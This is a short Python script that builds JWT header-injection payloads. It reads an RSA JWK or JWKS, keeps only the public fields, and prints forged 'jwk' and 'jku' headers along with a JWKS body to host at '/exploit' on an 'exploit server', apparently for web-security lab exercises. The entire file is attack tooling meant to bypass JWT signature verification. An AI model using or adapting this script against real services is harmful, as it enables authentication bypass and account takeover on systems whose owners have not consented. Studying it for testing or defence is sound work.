
import argparse
import json
import shutil

PUBLIC_FIELDS = {"kty", "e", "kid", "n", "use", "alg"}


def read_key_json():
    print("Paste a raw RSA JWK or JWKS JSON (multiline is supported):")
    lines = []
    while True:
        try:
            line = input()
        except EOFError as exc:
            raise ValueError("No complete key JSON was provided.") from exc

        if not line and lines:
            raise ValueError("Could not parse the pasted key JSON.")
        lines.append(line)
        try:
            return json.loads("\n".join(lines))
        except json.JSONDecodeError:
            continue


def load_key(path):
    if path:
        with open(path, encoding="utf-8") as key_file:
            return json.load(key_file)
    return read_key_json()


def select_jwk(key_data):
    if not isinstance(key_data, dict):
        raise ValueError("The key JSON must be a JWK object or a JWKS object.")

    if "keys" in key_data:
        keys = key_data["keys"]
        if not isinstance(keys, list) or not keys:
            raise ValueError("The JWKS 'keys' value must be a non-empty array.")
        rsa_keys = [key for key in keys if isinstance(key, dict) and key.get("kty") == "RSA"]
        if not rsa_keys:
            raise ValueError("The JWKS does not contain an RSA key.")
        key_data = rsa_keys[0]
        if len(rsa_keys) > 1:
            print("Multiple RSA keys found; using the first RSA key.")

    if key_data.get("kty") != "RSA":
        raise ValueError("The supplied JWK must be an RSA key.")
    return key_data


parser = argparse.ArgumentParser(
    description="Build JWT headers and a public JWKS from an RSA JWK or JWKS."
)
parser.add_argument(
    "key_file",
    nargs="?",
    help="path to a file containing a raw RSA JWK or JWKS (otherwise paste JSON)",
)
args = parser.parse_args()

key = select_jwk(load_key(args.key_file))
public_key = {k: v for k, v in key.items() if k in PUBLIC_FIELDS}
kid = public_key.get("kid", "<SET_KID>")

jku_url = input("Paste the exploit server / hosted JWKS URL: ").strip()

if not public_key.get("n") or not public_key.get("e"):
    raise ValueError("The RSA JWK must include its public modulus ('n') and exponent ('e').")

print("\n=== CLEAN PUBLIC JWK ===")
print(json.dumps(public_key, indent=4))
print("\n=== jwk HEADER ===")
print(json.dumps({"kid": kid, "typ": "JWT", "alg": "RS256", "jwk": public_key}, indent=4))
print("\n=== jku HEADER (fill URL) ===")
print(json.dumps({"kid": kid, "typ": "JWT", "alg": "RS256", "jku": jku_url}, indent=4))

jwks_body = json.dumps({"keys": [public_key]}, indent=4)
terminal_width = shutil.get_terminal_size(fallback=(80, 24)).columns
divider = "--" * (terminal_width // 2) + ("-" if terminal_width % 2 else "")

print("\n" + divider)
print("=== EXPLOIT SERVER OUTPUT ===")
print("File path: /exploit")
print("Content-Type: application/json")
print("Full JWKS body:")
print(jwks_body)
